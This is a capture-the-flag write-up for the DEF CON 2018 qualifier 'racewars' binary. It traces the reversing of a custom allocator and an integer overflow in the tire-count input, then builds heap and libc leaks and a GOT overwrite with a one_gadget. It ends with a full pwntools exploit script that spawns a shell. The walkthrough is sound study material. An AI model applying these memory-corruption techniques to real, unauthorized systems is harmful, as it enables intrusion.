# defcon quals 2018 racewars 

This writeup is based off of: https://github.com/balsn/ctf_writeup/tree/master/20180512-defconctfqual#race-wars

Let's take a look at the binary:
```
$	file racewars 
racewars: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=941f0d0ebe0ec01e79fca20aeb43b0f043b2ac34, stripped
$	pwn checksec racewars 
[*] '/home/guyinatuxedo/Desktop/dc18/racewars/racewars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$	./racewars 
I gotta get you racing again
so I can make some money off your ass.
There's a show down in the desert
called Race Wars.

I owe you a 10-second car.
And what this is about,
this is about Race Wars.

time to select your car.
pick:
	(1) tires
	(2) chassis
	(3) engine
	(4) transmission
 CHOICE: 1
choice 1
```

So we are dealing with a 64 bit binary, with a stack canary and NX (no RELRO or PIE). When we run the binary, we see that we are given a menu where we can select various parts for a car, and then can race it. We are also given the libc file `libc-2.23.so`.

### Reversing

So this is going to be a custom malloc problem. Starting off, it allocates a `0x2000` byte chunk which will serve as the memory for a datastructure which will store things about the car. It is initialized with the following values (the function that does this is called at `0x401a11`):

```
0x0:	ptr to chunk + 0x50 (ptr to end of allocated space)
0x8:	ptr to chunk + 0x2000
0x10:	0x0
0x18:	0x0
0x20:	0xfff
0x28:	ptr to chunk
0x30:	0x0
0x38:	0x0
0x40:	0x0
0x48:	0x0
```

Now the code will continually cipher off pieces of the `0x2000` block for other aspects of the car. When it does this, it will call a function at `0x400b66` that I call `adjustSize`. This function will check if the size of the chunk being allocated is greater than `0xfff` (unless if we input a huge amount of tire pairs, this shouldn't happen). If it is less than `0xfff` the function will essentially add the size being allocated to the ptr at the beginning of the car data structure (the one pointing to the end of allocated space) to signify the expansion of the allocated data. If it is bigger then it will allocate more space with malloc.

In addition to that, there is a variable stored at `rbp-0x18` that I call `ptrList`. This is used to keep a pointer to an area of the car data structure which contains pointers to the various parts of the car. When the program first starts, a `0x38` byte chunk is allocated from the car data structure with `adjustSize`, which serves as the inital place for this.

```
0x00:	chasis ptr
0x08:	tires ptr
0x10:	tires ptr
0x18:	tires ptr
0x20:	tires ptr
0x28:	transmission ptr
0x30:	engine ptr
```

#### Choose Tires

Starting off this menu option calls a function which is called at `0x401aca`, which prompts us for a number of tire pairs. Proceeding that it takes that number, and it multiplies it by `32` to figure out how much space to allocate. Then it will run the `adjustSize` function on the car data structure to allocate that much space. It will initalize the space allocated with the following values:

```
0x02:	0x41 ('A' four byte value)
0x04:   0x0f (four byte value)
0x06:   0x52 ('R' four byte value)
0x08:   0xffff (four byte value)
0x0a:	0x50 ('P' one  byte value)
0x0b:	0x00 (one byte value)
``` 

After that, a pointer to the data allocated for the tires is written to `ptrList` at the following offsets:

```
0x08:	ptr to tires data
0x10:	ptr to tires data
0x18:	ptr to tires data
0x20:	ptr to tires data
```


#### Choose Chasis

For this option, it first runs a function which is called at `0x401b20`. The function will print out chasis options and prompt us for which one, however this doesn't have any effect other than just printing out extra text. It will run the heap car structure through `adjustSize` with the size `0x18`. 

```
0x0:	0x1  (just 1 byte)
0x1:	0x5  (just 1 byte)
0x8:	ptr to this area (specifically where 0x0 is)
0x16:	0x0  (just 1 byte)
```

In addition to that, this option also updates the first value (offset `0x0`) of `ptrList` to be a pointer to whatever space was allocated for the chasis data.

#### Choose Engine

For this option, we don't actually get to give any input. The function that edits the car structure is called at `0x401b50`. It starts off by running `adjustSize` on the car structure with the size `0x18`. The area of memory that gets specified by it gets the following values assigned to the memory region pointed to by the return value of `adjustSize`:

```
0x0:	0x4  (just 1 byte)
0x1:	0x2  (just 1 byte)
0x2:	0x73 (just 1 byte)
0x3:	0x0  (just 1 byte)
0x8:	0x401f26 (ptr to EA113, eight byte qword)
0x10:	"jetta" (5 byte string)
0x16:	0x0  (eight byte qword)
```

After that a pointer to the memory for the engine data is stored in `ptrList` at the offset `0x30`.

#### Choose Transmission

For this option, we are first prompted with what option we want, and a `0x18` byte chunk is allocated from the car data structure with `adjustSize`. If we input a non-zero value, the `0x18` byte chunk is filled with the following value:

```
0x00:	0x5 (8 byte value)
0x08:	0x1 (1 byte value)
0x09:	0x5 (1 byte value)
0x0a:	0x4 (1 byte value)
0x0b:	0x3 (1 byte value)
0x0c:	0x2 (1 byte value)
0x0d:	0x1 (1 byte value)
```

and if you enter a `0` for the transimssion choice

```
0x00:	0x4 (8 byte value)
0x08:	0x0 (1 byte value)
0x09:	0x5 (1 byte value)
0x0a:	0x4 (1 byte value)
0x0b:	0x1 (1 byte value, however this value is first set to 2)
```

After that, a pointer to the transmission data is stored in `prtList` at the offset `0x28`

#### Modify Tires

After we select the componets for our car, we are given the options to edit any of our parts, buy a new part, or race. When we select the option to modify a tire, a function is ran at `0x401c95` with the pointer stored at `ptrList + 0x10` (which points to the tire data) as an argument. 

The function will prompt us for what we want to change regarding the tires. Now depending on our input, the code will allow us to scan in a four byte int into the following offsts of the tire data:

```
0x0: input 1
0x2: input 2
0x4: input 4
0x6: input 3 
```

#### Modify Chasis

For this option, it first checks to see if the value stored at the offset `0x16` in the chasis memory section is equal to `0`. If it is, then it will set the value equal to `1`. If not, then it will just return.

#### Modify Engine

This option starts off by checking to see if the byte stored at `enginePtr + 1` (`enginePtr` is the pointer pointing to the area of memory for the engine) is less than or equal to `0x3`. If it isn't, then the engine will break. When they engine breaks, it will free `enginePtr` and set it equal to `0x0`.

#### Modify Transmission 

This option just runs a function which is called at `0x401d08`, with the pointer stored at `ptrList + 0x28` (pointer to transmission memory area). The function prompts you for which gear to modify (input is scanned in as a `size_t`, I will call this `x` for now). If the value scanned in minus one is less than the value stored in the transmission area of memory at offset `0x0`, then the function continues (otherwise it will just print out an error message).

Then the function will prompt you again for if you want to set the gear (`1` for yes, `0` for no). If you select yes then then the value `y` is assigned to `transPtr + x + 9` where `transPtr` is the pointer to the start of the transmission memory area, and `y` is the second input given.

This function will also display output, however that is covered in the exploit section.

#### Racing

When this option is picked, it will run a function which is called at `0x401d82` which will go through and free some pointers from the car data structure.

### Exploit

Now the bug is in the `chooseTires` function which is at `0x4011c2`, and called at `0x401aca`. When it prompts us for the number of tire pairs, it checks to ensure that we enter in at least `2` tire pairs. This will prevent us from inputting `0x0`.

```
  __isoc99_scanf("%d", &numTires);
  if ( numTires <= 1 )
  {
    puts("you need at least 4 tires to drive...");
    exit(1);
  }
  tiresAlloc = 32 * numTires;
  LODWORD(tiresObject) = adjustSize(chunkPtr, 32 * numTires);
  tiresObjectTrsf = tiresObject;
```

However there is no upper bounds check for the number of tires we input, and no check on what the size value being passed to `adjustSize` is. As a result what we can do is input a large enough number, that we get an integer overflow which results in it wrapping around. If we input the right value, we will get it so that it allocates `0` bytes for the tires. This will allow us to overlap the tire data with other sections of the memory for the car structure.

To get the overflow to set it equal to `0`, we will need the product to be equal to `0x100000000`. Since `0x100000000 / 0x20 = 0x8000000` we will have to input `0x8000000` tire pairs.

#### Infoleak

The first potion of the exploit will be getting a libc infoleak. Before we do that, we will need to get a heap infoleak. We will be using the `modifyTransmission` function for the infoleak:

```
__int64 __fastcall modifyTransmission(_QWORD *transPtr)
{
  __int64 x1; // [sp+10h] [bp-20h]@1
  unsigned __int64 write; // [sp+18h] [bp-18h]@1
  __int64 x2; // [sp+20h] [bp-10h]@1
  __int64 v5; // [sp+28h] [bp-8h]@1

  v5 = *MK_FP(__FS__, 40LL);
  x1 = -1LL;
  write = 0xFFFFFFFFFFFFFFFFLL;
  x2 = -1LL;
  printf("ok, you have a transmission with %zu gears\n", *transPtr);
  printf("which gear to modify? ");
  __isoc99_scanf("%zu", &x1);
  if ( *transPtr > (unsigned __int64)--x1 )
  {
    printf("gear ratio for gear %zu is %zu, modify to what?: ", x1 + 1, *((_BYTE *)transPtr + x1 + 9));
    x2 = x1;
    __isoc99_scanf("%zu", &x1);
    printf("set gear to %d\n? (1 = yes, 0 = no)", x1);
    __isoc99_scanf("%zu", &write);
    if ( write )
      *((_BYTE *)transPtr + x2 + 9) = x1;
  }
  else
  {
    puts("ERROR: can't modify this gear.");
  }
  return *MK_FP(__FS__, 40LL) ^ v5;
}
```

As you can see, it will take the `transPtr` (ptr to transmission data), add our input plus nine to it, dereference it and then print it. What we can do is input a massive integer such as `0xffffffffffffffff` and cause the integer to rap around. That way we could print a value in the same memory region that we know the relative distance of. However before we do this, we will have to get around the fact that our input has to be smaller than the qword stored at `transPtr + 0x0`. For this we will use the bug explained above to overlap the tire and transmission data, then edit the tires to edit that value.

Now when we trigger the bug by requesting `0x8000000` (`134217728`) followed by picking a new transmission, we can see that in the `ptrList` that the memory regions overlap completely:

```
gef➤  x/10g 0x00604060
0x604060:	0x0000000000000000	0x0000000000604098
0x604070:	0x0000000000604098	0x0000000000604098
0x604080:	0x0000000000604098	0x0000000000604098
0x604090:	0x0000000000000000	0x0000000000000005
0x6040a0:	0x0000010203040501	0x0000000000000000
gef➤  x/x 0x604098
0x604098:	0x0000000000000005
```

We can see that the pointers for the tires (offsets `0x08`, `0x10`, `0x18`, `0x20`, `0x28`) and the poiter for the transmission (offset `0x28`) is the same. We can also see the current limit we have is `0x5` for the offset we can print with the `modifyTransmission` function. However when we add the enginer and chasis, then edit the four parts of the tires to be `0xff` we see that the limit expands to `0xffffffff`:

```
gef➤  x/10g 0x00604060
0x604060:	0x00000000006040b0	0x0000000000604098
0x604070:	0x0000000000604098	0x0000000000604098
0x604080:	0x0000000000604098	0x0000000000604098
0x604090:	0x00000000006040c8	0xffffffffffffffff
0x6040a0:	0x0000010203040501	0x0000000000000000
gef➤  x/g 0x0000000000604098
0x604098:	0xffffffffffffffff
```

With that we can now get an infoleak. We will first use the infoleak to get a heap infoleak. We will search for a heap pointer by just looking at what is in the heap which starts at `0x604000` in this iteration (after we exploit the bug and do the transmission / tires overlap):

```
gef➤  telescope 0x0000000000604000 40
0x0000000000604000│+0x0000: 0x0000000000000000
0x0000000000604008│+0x0008: 0x0000000000002011
0x0000000000604010│+0x0010: 0x00000000006040e0  →  0x0000000000000000
0x0000000000604018│+0x0018: 0x0000000000606010  →  0x0000000000000000

. . .
```

So here we can see that there are two heap pointers here that we can leak. Let's just go for the `0x6040e0` pointer at `0x604010` (as long as you can consistently get a heap pointer, you can go with any). When we try to give the offset `0xffffffffffffff00`, we end up with printing out the data at `0x603fa0`. So in order to print the data at `0x604010`, we need to add `0x70` to our offset and send `0xffffffffffffff70`. Also one thing about the infoleak, since it is one byte at a time we will need to print the offset `0xffffffffffffff70`, followed by `0xffffffffffffff71`, followed by `0xffffffffffffff72`, and continue until we have all eight bytes of the pointer. After that we can just subtract `0xe0` to get the heap base, since the offset is `0x6040e0 - 0x604000 = 0xe0`.

After that we can go ahead and leak a libc pointer by printing a got address (no need for PIE infoleak, since PIE isn't enabled). When we try the wrap around here, I first tried by just taking the desired pointer I wanted (got address for puts), and subtracting the address of `transPtr + 9` since that is added to it. This was off by one, so I had to decrement by plan to `transPtr + 9`. In addition to that the data which `transPtr` points to is `0x98` bytes ahead of the the start of the heap. Since we are dealing with the heap base, we will need to factor that in so the `-0x8` becomes `-0x8 - 0x98 = -0xa0`. With that we get the wrap around we need for it to hit the got address of puts, and give us the infoleak. Just like the last time, we have to leak this one byte at a time. Once we get the puts libc address, we can just subtract the offset of puts from the libc base to get the libc base

#### Write

Now that we know the base of both libc and the heap (and since the got table is writeable) we can do the got table write. We will be writing a onegadet, which once it's called will give us a shell. The function we will overwrite will be `exit`, since we can reliably call it (it is called when we fail the less than 2 check for tire pairs). In addition to that this function isn't in the middle of any critical code paths that we need in order to set this up. First we will need to find a onegadget (the github project for the tool can be found here: https://github.com/david942j/one_gadget):

```
$ one_gadget libc-2.23.so 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

When we go down this list (once we have RCE) we see that the gadget at offset `0xf1147` works (I tried the other three, and they didn't work for me). Now for the got table write, we will get the got table address the same way we got the got table address of puts (using the heap address to do a wrap around). Then we will use the libc address to calculate the address of the oneshot gadget, write it to the got table one byte at a time, and after it is done we can call system and get a shell:

Putting it all together, here is our exploit:
```
# This exploit is based off of: https://github.com/balsn/ctf_writeup/tree/master/20180512-defconctfqual#race-wars

from pwn import *

# Specify the target process. binary, and libc file
target = process('racewars', env = {"LD_PRELOAD":"./libc-2.23.so"})
gdb.attach(target)

elf = ELF('racewars')
libc = ELF('libc-2.23.so')

# These are four functions to deal with ordering new parts
def pickTires(pairs):
  target.sendline("1")
  print target.recvuntil("need?")
  target.sendline(str(pairs))

def pickChassis():
  target.sendline("2")
  print target.recvuntil("chassis...")
  target.sendline("2")
  print target.recvuntil("jetta")

def pickEngine():
  target.sendline("3")
  print target.recvuntil("jetta is the 2L")

def pickTransmission(gear):
  target.sendline("4")
  print target.recvuntil("transmission?")
  target.sendline(str(gear))

# These are two functions that deal with editing tires and the transmission
def editTires(qt, aspect):
  target.sendline("1")
  print target.recvuntil("what?")
  target.sendline(str(aspect))
  print target.recvuntil("new") 
  target.sendline(str(qt))

def editTransmission(modify, setVal, write):
  target.sendline("4")
  print target.recvuntil("modify?")
  target.sendline(str(modify))
  print target.recvuntil(" is ")
  leak = target.recvuntil(", modify")
  print "leak is: " + leak
  leak = leak.replace(", modify", "")
  target.sendline(str(setVal))
  print target.recvuntil("(1 = yes, 0 = no)")
  target.sendline(str(write))
  return int(leak)

# This is a function to just call `exit` for after the got write, by ordering 1 tire pairs
def buyNewTires():
  target.sendline("5")
  print target.recvuntil("CHOICE: ")
  target.sendline("1")
  print target.recvuntil("need?")
  target.sendline("1")

# This function will leak the heap, after the transmssion limit overwrite
def leakHeap():
  leak = ""
  for i in xrange(8):
    leak += chr(editTransmission(0xffffffffffffff70 + i, 0x1, 0x0)) 
  leak = u64(leak)
  heapBase = leak - 0xe0
  print "heap base is: " + hex(heapBase)
  return heapBase

# This function will leak the heap, after the transmssion limit overwrite
def leakLibc(heapBase):
  print "leaking libc"
  leakAdr = ((elf.got['puts'] - heapBase) - 0xa0) & 0xffffffffffffffff
  leak = ""
  for i in xrange(8):
    leak += chr(editTransmission(leakAdr + i, 0x1, 0x0))
  leak = u64(leak)
  libcBase = leak - libc.symbols["puts"]
  print "libc base is: " + hex(leak) 
  return libcBase

# This function will write the oneshot gadget, using the heap and libc base addresse
def writeOneShot(libcBase, heapBase):
  oneShot = libcBase + 0xf1147
  leakAdr = (elf.got['exit'] - heapBase - 0xa0) & 0xffffffffffffffff
  for i in xrange(8):
    editTransmission(leakAdr + i, ord(p64(oneShot)[i]), 0x1)
  print "oneshot: " + hex(libcBase + 0xf1147)

# First exploit the bug, and make the tires and transmission data overlap
pickTires(0x8000000)
pickTransmission(1)
pickChassis()
pickEngine()

# Edit the tires, to overwrite the max distance we can write with 0xffffffffffffffff
editTires(0xffff, 1)
editTires(0xffff, 2)
editTires(0xffff, 3)
editTires(0xffff, 4)

# Leak a heap pointer and calculate the heap base
# Use the heap base to leak a libc pointer, and get the libc base
heapAdr = leakHeap()
libcAdr = leakLibc(heapAdr)

# Use the heap and libc base addresses to write the oneshot gadget to the got address of exit
writeOneShot(libcAdr, heapAdr)

# Trigger the oneshot gadget by getting exit called, by buying 1 new tire pair 
buyNewTires()

# Drop to an interactive shell
target.interactive()
```   
